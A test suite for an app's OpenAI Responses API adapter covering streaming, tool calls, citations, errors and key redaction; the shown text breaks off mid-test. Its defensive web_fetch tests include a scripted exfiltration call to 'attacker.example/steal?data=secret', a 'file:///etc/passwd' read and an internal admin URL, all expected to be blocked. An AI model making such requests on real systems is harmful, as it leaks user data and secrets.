// The openai provider (OpenAI Responses API) behind runStream's ClaudeLike surface — request translation,
// SSE → Anthropic events (text, tool round trip with call_id, parallel calls, reasoning replay without item ids,
// web search citations, provider-run web_fetch through safefetch, incomplete / max tokens, refusal), HTTP and in-stream
// errors (codes, retries, no key in messages or logs), abort, provider selection, the /models picker and Auto routing.
// Everything runs against fake fetches and a loopback page server: nothing reaches a real endpoint.
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest';

const KEY = 'sk-proj-unit-test-key-0123456789abcdef';
const BASE = 'http://openai.test/v1';
process.env.NC_AI_PROVIDER = 'openai';
process.env.OPENAI_BASE_URL = `${BASE}/`;
process.env.OPENAI_API_KEY = KEY;
process.env.NC_AI_MODEL = 'gpt-test-astra';
delete process.env.NC_AI_FAST_MODEL;
delete process.env.ANTHROPIC_API_KEY;
process.env.NC_DEV_ALLOW_LOOPBACK_FETCH = '1';

type Json = Record<string, any>;

const MODELS_JSON = {
  models: [
    { slug: 'gpt-test-sol', display_name: 'GPT-Test-Sol', description: 'Latest workhorse model for coding and everyday work.', visibility: 'list', priority: 1, supported_reasoning_levels: [{ effort: 'low' }, { effort: 'medium' }, { effort: 'high' }, { effort: 'xhigh' }], input_modalities: ['text', 'image'], context_window: 500000, base_instructions: 'not used' },
    { slug: 'gpt-test-astra', display_name: 'GPT-Test-Astra', description: 'Frontier intelligence for the most demanding work.', visibility: 'list', priority: 2, supported_reasoning_levels: [{ effort: 'low' }, { effort: 'medium' }, { effort: 'high' }], input_modalities: ['text', 'image'] },
    { slug: 'gpt-test-reserve', display_name: 'GPT-Test-Reserve', description: 'Hidden model.', visibility: 'hide', priority: 3, supported_reasoning_levels: [{ effort: 'low' }], input_modalities: ['text'] },
    { slug: 'gpt-test-luna', display_name: 'GPT-Test-Luna', description: 'Fast and affordable model for easier tasks.', visibility: 'list', priority: 5, supported_reasoning_levels: [{ effort: 'low' }, { effort: 'medium' }], input_modalities: ['text'] },
    { slug: 'gpt-old-sol', display_name: 'GPT-Old-Sol', description: 'Older generation workhorse model.', visibility: 'list', priority: 6, supported_reasoning_levels: [{ effort: 'low' }], input_modalities: ['text', 'image'] },
  ],
};

let client: typeof import('../src/ai/client.ts');
let models: typeof import('../src/ai/models.ts');
let openaiModels: typeof import('../src/ai/providers/openaiModels.ts');
let openai: typeof import('../src/ai/providers/openai.ts');
let responses: typeof import('../src/ai/providers/responses.ts');
let config: typeof import('../src/ai/providers/config.ts');
let sse: typeof import('../src/ai/providers/sse.ts');
let defs: typeof import('../src/ai/tools/defs.ts');
let webFetch: typeof import('../src/ai/providers/webFetch.ts');

// ---- SSE fixtures shaped like the real endpoint's stream

function sseText(events: Json[]): string {
  const keep = [{ type: 'openai.keepalive' }, { type: 'openai.rate_limits', rate_limits: { allowed: true } }];
  return [...keep, ...events].map((e) => `event: ${e.type}\ndata: ${JSON.stringify(e)}\n\n`).join('') + 'data: [DONE]\n\n';
}

function bodyOf(text: string, chunk = 17, signal?: AbortSignal, hangAfter?: number): ReadableStream<Uint8Array> {
  const enc = new TextEncoder();
  let i = 0;
  return new ReadableStream<Uint8Array>({
    start(ctrl) {
      signal?.addEventListener('abort', () => ctrl.error(Object.assign(new Error('This operation was aborted'), { name: 'AbortError' })), { once: true });
    },
    async pull(ctrl) {
      if (hangAfter !== undefined && i >= hangAfter) return new Promise<void>(() => {});
      if (i >= text.length) return ctrl.close();
      ctrl.enqueue(enc.encode(text.slice(i, i + chunk)));
      i += chunk;
    },
  });
}

const usage = (input = 100, cached = 40, written = 10, output = 20) => ({ input_tokens: input, input_tokens_details: { cached_tokens: cached, cache_write_tokens: written }, output_tokens: output, output_tokens_details: { reasoning_tokens: 3 } });
const created = (model = 'gpt-test-astra') => ({ type: 'response.created', sequence_number: 0, response: { id: 'resp_test', object: 'response', model, status: 'in_progress', output: [] } });
const completed = (u: Json = usage(), model = 'gpt-test-astra') => ({ type: 'response.completed', response: { id: 'resp_test', model, status: 'completed', output: [], usage: u } });

function message(oi: number, parts: (string | Json)[], opts: { text?: string } = {}): Json[] {
  const text = opts.text ?? parts.filter((p) => typeof p === 'string').join('');
  return [
    { type: 'response.output_item.added', output_index: oi, item: { id: `msg_${oi}`, type: 'message', status: 'in_progress', content: [], phase: 'final_answer', role: 'assistant' } },
    { type: 'response.content_part.added', output_index: oi, content_index: 0, item_id: `msg_${oi}`, part: { type: 'output_text', annotations: [], text: '' } },
    ...parts.map((p) => (typeof p === 'string'
      ? { type: 'response.output_text.delta', output_index: oi, content_index: 0, item_id: `msg_${oi}`, delta: p }
      : { type: 'response.output_text.annotation.added', output_index: oi, content_index: 0, item_id: `msg_${oi}`, annotation_index: 0, annotation: p })),
    { type: 'response.metadata', metadata: {} },
    { type: 'response.output_text.done', output_index: oi, content_index: 0, item_id: `msg_${oi}`, text },
    { type: 'response.content_part.done', output_index: oi, content_index: 0, item_id: `msg_${oi}`, part: { type: 'output_text', text } },
    { type: 'response.output_item.done', output_index: oi, item: { id: `msg_${oi}`, type: 'message', status: 'completed', role: 'assistant', content: [{ type: 'output_text', text, annotations: [] }] } },
  ];
}

function reasoning(oi: number, enc = 'ENC-1'): Json[] {
  return [
    { type: 'response.output_item.added', output_index: oi, item: { id: `rs_${oi}`, type: 'reasoning', summary: [] } },
    { type: 'response.output_item.done', output_index: oi, item: { id: `rs_${oi}`, type: 'reasoning', summary: [], encrypted_content: enc } },
  ];
}

function call(oi: number, callId: string, name: string, args: string, opts: { stream?: boolean } = {}): Json[] {
  const fc = `fc_${oi}`;
  return [
    { type: 'response.output_item.added', output_index: oi, item: { id: fc, type: 'function_call', call_id: callId, name, arguments: '', status: 'in_progress' } },
    ...(opts.stream ? [args.slice(0, 5), args.slice(5)].filter(Boolean).map((d) => ({ type: 'response.function_call_arguments.delta', output_index: oi, item_id: fc, delta: d })) : []),
    { type: 'response.function_call_arguments.done', output_index: oi, item_id: fc, arguments: args },
    { type: 'response.output_item.done', output_index: oi, item: { id: fc, type: 'function_call', call_id: callId, name, arguments: args, status: 'completed' } },
  ];
}

function webSearch(oi: number, query: string, urls: string[]): Json[] {
  const id = `ws_${oi}`;
  return [
    { type: 'response.output_item.added', output_index: oi, item: { id, type: 'web_search_call', status: 'in_progress' } },
    { type: 'response.web_search_call.in_progress', output_index: oi, item_id: id },
    { type: 'response.web_search_call.searching', output_index: oi, item_id: id },
    { type: 'response.web_search_call.completed', output_index: oi, item_id: id },
    { type: 'response.output_item.done', output_index: oi, item: { id, type: 'web_search_call', status: 'completed', action: { type: 'search', query, queries: [query], sources: urls.map((url) => ({ type: 'url', url })) } } },
  ];
}

interface Seen { url: string; headers: Record<string, string>; body: Json }

/** A fetch that answers each /responses request with the next scripted reply. */
function fakeFetch(replies: (Json[] | ((seen: Seen, signal?: AbortSignal) => Response | Promise<Response>))[], seen: Seen[] = []) {
  let n = 0;
  const f = vi.fn(async (url: string | URL | Request, init?: RequestInit) => {
    const s: Seen = { url: String(url), headers: Object.fromEntries(new Headers(init?.headers).entries()), body: JSON.parse(String(init?.body ?? '{}')) };
    seen.push(s);
    const r = replies[Math.min(n++, replies.length - 1)];
    if (typeof r === 'function') return r(s, init?.signal ?? undefined);
    return new Response(bodyOf(sseText(r), 17, init?.signal ?? undefined), { status: 200, headers: { 'content-type': 'text/event-stream', 'x-request-id': `req_${n}` } });
  });
  return f;
}

function adapter(f: ReturnType<typeof fakeFetch>, extra: Json = {}) {
  return openai.openaiClient({ baseUrl: BASE, apiKey: KEY }, { fetch: f as unknown as typeof fetch, retryDelays: [0, 0], ...extra });
}

const req = (text: string, extra: Json = {}): any => ({ system: [{ type: 'text', text: 'SYSTEM RULES', cache_control: { type: 'ephemeral' } }, { type: 'text', text: 'PERSONA' }], messages: [{ role: 'user', content: [{ type: 'text', text, cache_control: { type: 'ephemeral' } }] }], effort: 'medium', maxTokens: 64_000, ...extra });

beforeAll(async () => {
  openaiModels = await import('../src/ai/providers/openaiModels.ts');
  openaiModels.setOpenAIModelsFetch((async () => new Response(JSON.stringify(MODELS_JSON), { status: 200, headers: { 'content-type': 'application/json' } })) as unknown as typeof fetch);
  config = await import('../src/ai/providers/config.ts');
  models = await import('../src/ai/models.ts');
  client = await import('../src/ai/client.ts');
  openai = await import('../src/ai/providers/openai.ts');
  responses = await import('../src/ai/providers/responses.ts');
  sse = await import('../src/ai/providers/sse.ts');
  defs = await import('../src/ai/tools/defs.ts');
  webFetch = await import('../src/ai/providers/webFetch.ts');
  await openaiModels.refreshOpenAIModels();
});

afterEach(() => {
  vi.restoreAllMocks();
});

describe('openai adapter: text and request translation', () => {
  it('streams text, maps usage and translates the request (instructions, input, effort, store:false, nothing Anthropic-only)', async () => {
    const seen: Seen[] = [];
    const f = fakeFetch([[created(), ...reasoning(0), ...message(1, ['Hel', 'lo ', 'world.']), completed()]], seen);
    const deltas: string[] = [];
    let thinking = 0;
    const r = await client.runStream(req('Hi there'), { onText: (d) => deltas.push(d), onThinking: () => thinking++ }, { client: adapter(f) });
    expect(r.text).toBe('Hello world.');
    expect(deltas.join('')).toBe('Hello world.');
    expect(thinking).toBe(1);
    expect(r.stopReason).toBe('end_turn');
    expect(r.model).toBe('gpt-test-astra');
    expect(r.usage).toEqual({ input: 50, output: 20, cacheRead: 40, cacheWrite: 10 });
    expect(seen).toHaveLength(1);
    const { url, headers, body } = seen[0];
    expect(url).toBe(`${BASE}/responses`);
    expect(headers.authorization).toBe(`Bearer ${KEY}`);
    expect(body).toMatchObject({ model: 'gpt-test-astra', instructions: 'SYSTEM RULES\n\nPERSONA', stream: true, store: false, reasoning: { effort: 'medium' } });
    expect(body.input).toEqual([{ type: 'message', role: 'user', content: [{ type: 'input_text', text: 'Hi there' }] }]);
    expect(body.include).toContain('reasoning.encrypted_content');
    for (const k of ['max_output_tokens', 'max_tokens', 'system', 'messages', 'thinking', 'output_config', 'betas', 'fallbacks', 'cache_control', 'tools', 'temperature', 'mcp_servers']) expect(body).not.toHaveProperty(k);
  });

  it('maps images and PDFs to input_image / input_file, and leaves images out for text-only models', () => {
    const params = { model: 'm', system: 'S', messages: [{ role: 'user', content: [
      { type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'iVBORw0K' } },
      { type: 'document', title: 'spec', source: { type: 'base64', media_type: 'application/pdf', data: 'JVBERi0x' } },
      { type: 'text', text: 'What is in these?' },
    ] }] };
    const r = responses.buildResponsesRequest(params, { model: 'm' });
    expect(r.body.input[0].content).toEqual([
      { type: 'input_image', image_url: 'data:image/png;base64,iVBORw0K', detail: 'auto' },
      { type: 'input_file', filename: 'spec.pdf', file_data: 'data:application/pdf;base64,JVBERi0x' },
      { type: 'input_text', text: 'What is in these?' },
    ]);
    const noImg = responses.buildResponsesRequest(params, { model: 'm', images: false });
    expect(noImg.body.input[0].content[0].type).toBe('input_text');
    expect(noImg.body.input[0].content[0].text).toMatch(/can’t read images/);
  });

  it('aliases tool names the API refuses and maps calls back; maps tool_choice', () => {
    const params = { model: 'm', system: 'S', messages: [{ role: 'user', content: 'x' }], tools: [{ name: 'weird.tool name', description: 'd', input_schema: { type: 'object', properties: {} } }, { name: 'fine_tool', description: 'd', input_schema: { type: 'object', properties: {} } }], tool_choice: { type: 'tool', name: 'weird.tool name' } };
    const r = responses.buildResponsesRequest(params, { model: 'm' });
    const alias = r.body.tools[0].name;
    expect(alias).toMatch(/^tool_[0-9a-f]{16}$/);
    expect(r.body.tools[1]).toEqual({ type: 'function', name: 'fine_tool', description: 'd', parameters: { type: 'object', properties: {} }, strict: false });
    expect(r.body.tool_choice).toEqual({ type: 'function', name: alias });
    const tr = new responses.ResponsesTranslator(r.names, { citations: false, webFetch: false, knownUrls: new Set() });
    tr.beginResponse();
    for (const e of call(0, 'call_x', alias, '{"a":1}')) tr.handle(e.type, e);
    expect(tr.finalMessage().content[0]).toMatchObject({ type: 'tool_use', id: 'call_x', name: 'weird.tool name', input: { a: 1 } });
    expect(responses.assistantItems(tr.content, r.names)[0]).toEqual({ type: 'function_call', call_id: 'call_x', name: alias, arguments: '{"a":1}' });
  });

  it('parses SSE across chunk boundaries and CRLF line endings', async () => {
    const text = 'event: a\r\ndata: {"x":1}\r\n\r\n: comment\n\nevent: b\ndata: line1\ndata: line2\n\ndata: [DONE]\n\n';
    for (const size of [1, 3, 7, 1000]) {
      const out: { event: string | null; data: string }[] = [];
      for await (const ev of sse.readSse(bodyOf(text, size) as unknown as AsyncIterable<Uint8Array>)) out.push(ev);
      expect(out).toEqual([{ event: 'a', data: '{"x":1}' }, { event: 'b', data: 'line1\nline2' }, { event: null, data: '[DONE]' }]);
    }
  });
});

describe('openai adapter: tools', () => {
  it('runs a tool round trip with parallel calls, replaying call_ids and reasoning without item ids', async () => {
    const seen: Seen[] = [];
    const f = fakeFetch([
      [created(), ...reasoning(0, 'ENC-ROUND-1'), ...message(1, ['Let me look.']), ...call(2, 'call_A', 'search_workspace', '{"query":"roadmap"}', { stream: true }), ...call(3, 'call_B', 'read_page', '{"page_id":"0f0f0f0f-0000-4000-8000-000000000001"}'), completed(usage(200, 0, 0, 30))],
      [created(), ...message(0, ['Found ', 'it.']), completed(usage(300, 200, 0, 10))],
    ], seen);
    const ran: [string, Json][] = [];
    const announced: string[] = [];
    const r = await client.runStream(req('find the roadmap', { tools: defs.toolParams(['search_workspace', 'read_page']) }), { onTool: (n) => announced.push(n) }, {
      client: adapter(f),
      executeTool: async (name, input) => {
        ran.push([name, input]);
        return name === 'read_page' ? { content: 'page text', isError: true } : { content: 'result A' };
      },
    });
    expect(ran).toEqual([['search_workspace', { query: 'roadmap' }], ['read_page', { page_id: '0f0f0f0f-0000-4000-8000-000000000001' }]]);
    expect(announced).toEqual(['search_workspace', 'read_page']);
    expect(r.text).toBe('Let me look.\n\nFound it.');
    expect(r.usage).toEqual({ input: 300, output: 40, cacheRead: 200, cacheWrite: 0 });
    const first = seen[0].body;
    expect(first.tools.map((t: Json) => [t.type, t.name, t.strict])).toEqual([['function', 'search_workspace', false], ['function', 'read_page', false]]);
    expect(first.tools[0].parameters.required).toEqual(['query']);
    expect(first).toMatchObject({ tool_choice: 'auto', parallel_tool_calls: true });
    const second = seen[1].body.input;
    expect(second).toEqual([
      first.input[0],
      { type: 'reasoning', summary: [], encrypted_content: 'ENC-ROUND-1' },
      { type: 'message', role: 'assistant', content: [{ type: 'output_text', text: 'Let me look.' }] },
      { type: 'function_call', call_id: 'call_A', name: 'search_workspace', arguments: '{"query":"roadmap"}' },
      { type: 'function_call', call_id: 'call_B', name: 'read_page', arguments: '{"page_id":"0f0f0f0f-0000-4000-8000-000000000001"}' },
      { type: 'function_call_output', call_id: 'call_A', output: 'result A' },
      { type: 'function_call_output', call_id: 'call_B', output: 'Error: page text' },
    ]);
    // store is false: no item ids may be replayed
    expect(JSON.stringify(second)).not.toMatch(/"id":"(rs|fc|msg)_/);
  });

  it('turns an incomplete response (max_output_tokens) into max_tokens, and a cut-off tool call into an error result', async () => {
    const seen: Seen[] = [];
    const incomplete = { type: 'response.incomplete', response: { id: 'resp_test', model: 'gpt-test-astra', status: 'incomplete', incomplete_details: { reason: 'max_output_tokens' }, output: [], usage: usage(10, 0, 0, 5) } };
    const f = fakeFetch([
      [created(), ...call(0, 'call_cut', 'search_workspace', '{"query":"a"}'), incomplete],
      [created(), ...message(0, ['Done.']), completed()],
    ], seen);
    const ran: string[] = [];
    const r = await client.runStream(req('x', { tools: defs.toolParams(['search_workspace']) }), {}, { client: adapter(f), executeTool: async (n) => { ran.push(n); return { content: 'ok' }; } });
    expect(ran).toEqual([]);
    expect(seen[1].body.input.at(-1)).toEqual({ type: 'function_call_output', call_id: 'call_cut', output: expect.stringMatching(/^Error: Your tool input was cut off/) });
    expect(r.text).toBe('Done.');
    const g = fakeFetch([[created(), ...message(0, ['Partial']), incomplete]]);
    const r2 = await client.runStream(req('x'), {}, { client: adapter(g) });
    expect(r2).toMatchObject({ stopReason: 'max_tokens', text: 'Partial', refused: false });
  });

  it('reports a refusal content part as refused (and drops its text)', async () => {
    const f = fakeFetch([[
      created(),
      { type: 'response.output_item.added', output_index: 0, item: { id: 'msg_0', type: 'message', role: 'assistant', content: [] } },
      { type: 'response.content_part.added', output_index: 0, content_index: 0, part: { type: 'refusal', refusal: '' } },
      { type: 'response.refusal.delta', output_index: 0, content_index: 0, delta: 'I can’t help with that.' },
      { type: 'response.refusal.done', output_index: 0, content_index: 0, refusal: 'I can’t help with that.' },
      { type: 'response.output_item.done', output_index: 0, item: { id: 'msg_0', type: 'message', role: 'assistant', content: [{ type: 'refusal', refusal: 'I can’t help with that.' }] } },
      completed(),
    ]]);
    const r = await client.runStream(req('something bad'), {}, { client: adapter(f) });
    expect(r).toMatchObject({ refused: true, text: '', stopReason: 'refusal' });
  });

  it('rebuilds a response whose items were only listed in response.completed', async () => {
    const out = [{ type: 'message', id: 'msg_x', role: 'assistant', content: [{ type: 'output_text', text: 'From the final object.', annotations: [] }] }];
    const f = fakeFetch([[created(), { type: 'response.completed', response: { id: 'r', model: 'gpt-test-astra', status: 'completed', output: out, usage: usage() } }]]);
    const r = await client.runStream(req('x'), {}, { client: adapter(f) });
    expect(r.text).toBe('From the final object.');
  });
});

describe('openai adapter: web search and web_fetch', () => {
  const ann = (text: string, link: string, url: string, title: string) => ({ type: 'url_citation', start_index: [...text].length, end_index: [...text].length + [...link].length, url, title });

  it('turns web_search into server-tool callbacks and url_citation annotations into numbered citations', async () => {
    const seen: Seen[] = [];
    const before = 'Node 26 is current 🚀 — 최신. ';
    const link = '([nodejs.org](https://nodejs.org/en/download))';
    const f = fakeFetch([[created(), ...webSearch(0, 'node latest', ['https://nodejs.org/en/download', 'https://github.com/nodejs/node/releases']),
      ...message(1, ['Node 26 is current 🚀', ' — 최신. ', '([nodejs.org](https://nodejs.', 'org/en/download))', ann(before, link, 'https://nodejs.org/en/download?utm_source=openai', 'Node.js — Download'), ' See [the docs](https://d.example/x) too.']), completed()]], seen);
    const tools: Json[] = [];
    const results: Json[] = [];
    const cited: Json[] = [];
    const r = await client.runStream(req('latest node?', { serverTools: models.webToolDefs('gpt-test-astra', { fetch: false }) }), {
      onServerTool: (e) => tools.push(e),
      onServerResult: (e) => results.push(e),
      cite: (c) => { cited.push(c); return cited.length; },
    }, { client: adapter(f) });
    expect(seen[0].body.tools).toEqual([{ type: 'web_search' }]);
    expect(seen[0].body.include).toEqual(['reasoning.encrypted_content', 'web_search_call.action.sources']);
    expect(tools).toEqual([{ id: 'ws_0', name: 'web_search', input: { query: 'node latest' } }]);
    expect(results).toEqual([{ toolUseId: 'ws_0', type: 'web_search_tool_result', results: [{ url: 'https://nodejs.org/en/download', title: 'nodejs.org' }, { url: 'https://github.com/nodejs/node/releases', title: 'github.com' }] }]);
    expect(cited).toEqual([{ url: 'https://nodejs.org/en/download', title: 'Node.js — Download' }]);
    // the inline link is replaced by the citation number; an ordinary link without an annotation stays
    expect(r.text).toBe('Node 26 is current 🚀 — 최신.[1] See [the docs](https://d.example/x) too.');
  });

  it('keeps adjacent citations together and releases links that get no annotation', () => {
    const out: string[] = [];
    const cites: string[] = [];
    let open = false;
    const part = new responses.TextPart({ text: (s) => { open = true; out.push(s); }, cite: (c) => { open = true; cites.push(c.url); out.push(`{${c.url}}`); }, close: () => { if (open) out.push('|'); open = false; } }, true);
    const text = 'A fact. ([a.com](https://a.com/1)) ([b.com](https://b.com/2)) Then [x](https://x.y/z) and [1] - [ ] done.';
    part.push(text.slice(0, 12));
    part.push(text.slice(12, 37));
    part.annotate({ type: 'url_citation', url: 'https://a.com/1', title: 'A', start_index: 8, end_index: 34 });
    part.push(text.slice(37, 64));
    part.annotate({ type: 'url_citation', url: 'https://b.com/2', title: 'B', start_index: 35, end_index: 61 });
    part.push(text.slice(64));
    part.end();
    expect(cites).toEqual(['https://a.com/1', 'https://b.com/2']);
    expect(out.join('')).toBe('A fact.{https://a.com/1}{https://b.com/2}| Then [x](https://x.y/z) and [1] - [ ] done.|');
  });

  it('opens pages for web_fetch through safefetch (only conversation URLs), continuing the answer in the same stream', async () => {
    let hits = 0;
    const srv: Server = createServer((rq, rs) => {
      hits++;
      rs.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      rs.end('<html><head><title>Fixture page</title><script>evil()</script></head><body><h1>Hello from the page</h1><p>See <a href="/more">more</a>.</p></body></html>');
    });
    await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()));
    const pageUrl = `http://127.0.0.1:${(srv.address() as AddressInfo).port}/page`;
    try {
      const seen: Seen[] = [];
      const f = fakeFetch([
        [created(), ...call(0, 'call_f1', 'web_fetch', JSON.stringify({ url: pageUrl })), ...call(1, 'call_f2', 'web_fetch', JSON.stringify({ url: 'https://attacker.example/steal?data=secret' })), completed()],
        [created(), ...message(0, ['The page says hello.']), completed()],
      ], seen);
      const tools: Json[] = [];
      const results: Json[] = [];
      const r = await client.runStream(req(`summarize ${pageUrl}`, { serverTools: models.webToolDefs('gpt-test-astra', { fetch: true }) }), { onServerTool: (e) => tools.push(e), onServerResult: (e) => results.push(e) }, { client: adapter(f) });
      expect(seen[0].body.tools.map((t: Json) => t.name ?? t.type)).toEqual(['web_search', 'web_fetch']);
      expect(hits).toBe(1);
      expect(tools.map((t) => [t.name, t.input.url])).toEqual([['web_fetch', pageUrl], ['web_fetch', 'https://attacker.example/steal?data=secret']]);
      expect(results[0]).toMatchObject({ type: 'web_fetch_tool_result', results: [{ url: pageUrl, title: 'Fixture page' }] });
      expect(results[1]).toMatchObject({ type: 'web_fetch_tool_result', results: [], error: 'url_not_allowed' });
      expect(r.text).toBe('The page says hello.');
      const replay = seen[1].body.input;
      const out1 = replay.find((i: Json) => i.type === 'function_call_output' && i.call_id === 'call_f1');
      expect(out1.output).toContain('Hello from the page');
      expect(out1.output).toContain(`more (http://127.0.0.1:${(srv.address() as AddressInfo).port}/more)`);
      expect(out1.output).not.toContain('evil');
      expect(replay.find((i: Json) => i.call_id === 'call_f2' && i.type === 'function_call_output').output).toMatch(/^Error: This URL can’t be opened/);
      // allowed domains (Custom Agents' trusted sites) also limit where it may go
      const g = fakeFetch([[created(), ...call(0, 'call_f3', 'web_fetch', JSON.stringify({ url: pageUrl })), completed()], [created(), ...message(0, ['ok']), completed()]]);
      const res2: Json[] = [];
      const defs2 = models.webToolDefs('gpt-test-astra', { fetch: true }).map((d) => (d.name === 'web_fetch' ? { ...d, allowed_domains: ['docs.example.org'] } : d));
      await client.runStream(req(`read ${pageUrl}`, { serverTools: defs2 }), { onServerResult: (e) => res2.push(e) }, { client: adapter(g) });
      expect(res2[0].error).toBe('url_not_allowed');
      expect(hits).toBe(1);
    } finally {
      srv.close();
    }
  });
});

describe('provider-run web_fetch', () => {
  it('reads public pages only (SSRF rules), never leaves the allowed domains through a redirect, and keeps links', async () => {
    const srv: Server = createServer((rq, rs) => {
      const port = (srv.address() as AddressInfo).port;
      if (rq.url === '/go') {
        rs.writeHead(302, { location: `http://localhost:${port}/page` });
        return rs.end();
      }
      rs.writeHead(200, { 'content-type': 'text/html' });
      rs.end('<title>T</title><p>Body <a href="https://example.org/x">x</a></p>');
    });
    await new Promise<void>((r) => srv.listen(0, '127.0.0.1', () => r()));
    const base = `http://127.0.0.1:${(srv.address() as AddressInfo).port}`;
    try {
      const page = await webFetch.fetchWebPage({ url: `${base}/page`, allowedDomains: ['127.0.0.1'], knownUrls: new Set(), maxChars: 1000 });
      expect(page).toMatchObject({ title: 'T' });
      expect(page.text).toContain('Body x (https://example.org/x)');
      expect(await webFetch.fetchWebPage({ url: `${base}/go`, allowedDomains: ['127.0.0.1'], knownUrls: new Set(), maxChars: 1000 })).toMatchObject({ error: 'url_not_allowed' });
      expect(await webFetch.fetchWebPage({ url: 'http://10.0.0.8/admin', knownUrls: new Set(['http://10.0.0.8/admin']), maxChars: 1000 })).toMatchObject({ error: 'url_not_allowed' });
      expect(await webFetch.fetchWebPage({ url: 'file:///etc/passwd', knownUrls: new Set(), maxChars: 1000 })).toMatchObject({ error: 'invalid_input' });
    } finally {
      srv.close();
    }
  });
});

describe('openai adapter: errors and abort', () => {
  const errSpy = () => vi.spyOn(console, 'error').mockImplementation(() => {});

  it('maps HTTP errors to AiError codes without the key, retrying only transient ones', async () => {
    const http = (status: number, body: Json | string, headers: Record<string, string> = {}) => () => new Response(typeof body === 'string' ? body : JSON.stringify(body), { status, headers: { 'content-type': 'application/json', 'x-request-id': 'req_err', ...headers } });
    const run = async (f: ReturnType<typeof fakeFetch>) => client.runStream(req('x'), {}, { client: adapter(f) }).then(() => null, (e) => client.mapError(e));
    let f = fakeFetch([http(401, { error: { message: `Invalid API key ${KEY}`, type: 'authentication_error', code: 'invalid_api_key' } })]);
    let e = await run(f);
    expect(e).toMatchObject({ code: 'invalid_key', status: 400 });
    expect(e!.message).toContain('OPENAI_API_KEY');
    expect(e!.message).not.toContain(KEY);
    expect((e as any).detail).not.toContain(KEY);
    expect(f).toHaveBeenCalledTimes(1);

    f = fakeFetch([http(429, { error: { type: 'rate_limit_exceeded', message: 'slow down' } })]);
    expect(await run(f)).toMatchObject({ code: 'rate_limited', status: 429 });
    expect(f).toHaveBeenCalledTimes(3);
    f = fakeFetch([http(429, { error: { type: 'usage_limit_reached', message: 'You have hit your usage limit' } })]);
    e = await run(f);
    expect(e).toMatchObject({ code: 'rate_limited' });
    expect(e!.message).toMatch(/usage limit/);
    expect(f).toHaveBeenCalledTimes(1);

    f = fakeFetch([http(502, 'Bad gateway'), [created(), ...message(0, ['recovered']), completed()]]);
    expect(await client.runStream(req('x'), {}, { client: adapter(f) })).toMatchObject({ text: 'recovered' });
    expect(f).toHaveBeenCalledTimes(2);

    f = fakeFetch([[{ type: 'error', status: 400, error: { type: 'invalid_request_error', message: "The 'gpt-nope' model is not supported by the configured endpoint." } }]]);
    e = await run(f);
    expect(e).toMatchObject({ code: 'not_found' });
    expect(e!.message).toContain('gpt-test-astra');
    expect(f).toHaveBeenCalledTimes(1);

    f = fakeFetch([[created(), { type: 'response.failed', response: { id: 'resp_f', status: 'failed', error: { code: 'server_error', message: 'boom' } } }]]);
    expect(await run(f)).toMatchObject({ code: 'overloaded' });
    expect(f).toHaveBeenCalledTimes(3);

    f = fakeFetch([http(400, { error: { type: 'invalid_request_error', code: 'context_length_exceeded', message: 'Your input exceeds the context window of this model.' } })]);
    expect((await run(f))!.message).toMatch(/too long for the model/);

    f = fakeFetch([() => { throw new TypeError('fetch failed'); }]);
    expect(await run(f)).toMatchObject({ code: 'network' });
    expect(f).toHaveBeenCalledTimes(3);

    // a stream that stops before response.completed is not a silent success
    f = fakeFetch([[created(), ...message(0, ['half'])].slice(0, 4)]);
    expect(await run(f)).toMatchObject({ code: 'overloaded' });
  });

  it('logs status / request id / provider detail, never the key', async () => {
    const spy = errSpy();
    const f = fakeFetch([() => new Response(JSON.stringify({ error: { message: `bad key ${KEY} Bearer ${KEY}`, type: 'authentication_error' } }), { status: 401, headers: { 'x-request-id': 'req_log_1' } })]);
    await client.runStream(req('x'), {}, { client: adapter(f) }).catch((e) => client.logAiError('chat', e));
    const line = spy.mock.calls.map((c) => c.join(' ')).join('\n');
    expect(line).toMatch(/\[ai\] chat failed: invalid_key status=401 request_id=req_log_1/);
    expect(line).not.toContain(KEY);
    expect(line).toContain('bad key [redacted] Bearer [redacted]');
  });

  it('stops on abort and returns the partial text', async () => {
    const ac = new AbortController();
    const text = sseText([created(), ...message(0, ['First part. ', 'Second part.'])]);
    const cut = text.indexOf('Second part.') - 40;
    const f = fakeFetch([(_s, signal) => new Response(bodyOf(text, 9, signal, cut), { status: 200, headers: { 'content-type': 'text/event-stream' } })]);
    const r = await client.runStream(req('x'), { onText: (d) => { if (d.includes('First')) setTimeout(() => ac.abort(), 5); } }, { client: adapter(f), signal: ac.signal });
    expect(r).toMatchObject({ aborted: true, stopReason: 'aborted', text: 'First part.' });
  });

  it('times out a silent stream', async () => {
    const f = fakeFetch([(_s, signal) => new Response(bodyOf(sseText([created()]), 9, signal, 30), { status: 200 })]);
    const e = await client.runStream(req('x'), {}, { client: adapter(f, { idleMs: 60, retryDelays: [] }) }).then(() => null, (err) => client.mapError(err));
    expect(e).toMatchObject({ code: 'overloaded' });
    expect(e!.message).toMatch(/too long/);
  });
});

describe('provider selection, models and Auto', () => {
  const saved = { ...process.env };
  afterAll(() => {
    for (const k of ['NC_AI_PROVIDER', 'OPENAI_BASE_URL', 'OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'NC_AI_MODEL', 'NC_AI_FAST_MODEL']) {
      if (saved[k] === undefined) delete process.env[k];
      else process.env[k] = saved[k];
    }
  });

  it('chooses the provider from NC_AI_PROVIDER, else openai, else Anthropic, else none', () => {
    const set = (v: Record<string, string | undefined>) => {
      for (const [k, x] of Object.entries(v)) if (x === undefined) delete process.env[k]; else process.env[k] = x;
    };
    set({ NC_AI_PROVIDER: undefined, OPENAI_BASE_URL: BASE, OPENAI_API_KEY: KEY, ANTHROPIC_API_KEY: 'sk-ant-test-0000000000' });
    expect(config.providerId()).toBe('openai');
    set({ OPENAI_API_KEY: undefined });
    expect(config.providerId()).toBe('anthropic');
    expect(client.aiConfigured()).toBe(true);
    set({ ANTHROPIC_API_KEY: undefined });
    expect(config.providerId()).toBe('none');
    expect(client.aiConfigured()).toBe(false);
    expect(() => client.requireConfigured()).toThrow(client.NO_KEY_MESSAGE);
    expect(client.NO_KEY_MESSAGE).toBe('Connect an AI provider to use Litpage AI');
    set({ NC_AI_PROVIDER: 'openai' });
    expect(client.aiConfigured()).toBe(false);
